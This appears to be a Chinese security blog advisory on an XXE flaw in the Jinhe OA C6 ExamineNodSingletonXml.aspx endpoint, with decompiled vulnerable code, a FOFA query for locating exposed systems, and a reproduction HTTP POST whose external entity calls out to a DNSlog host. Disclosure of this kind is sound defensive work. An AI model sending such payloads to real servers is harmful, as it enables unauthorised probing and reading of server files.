---
title: "金和OA ExamineNodSingletonXml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ExamineNodSingletonXml-xxe.html
asset_dir: assets/金和oa-examinenodsingletonxml.aspx-xxe漏洞
---

# 金和OA ExamineNodSingletonXml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/23 23:34
- 484浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

物流软件安全

Web安全课程

漏洞预警服务

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ExamineNodSingletonXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ExamineNodSingletonXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ExamineNod.dll` 将其进行反编译后找到 **ExamineNodSingletonXml** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  this.InitText();
  this.m_ExamineNod.Path = this.Server.MapPath("../bin").ToString() + "\\";
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

深入探索

网络安全课程

漏洞扫描器

安全运维咨询

# 漏洞复现

```
POST /c6/Jhsoft.Web.examinenod/ExamineNodSingletonXml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA ExamineNodSingletonXml.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
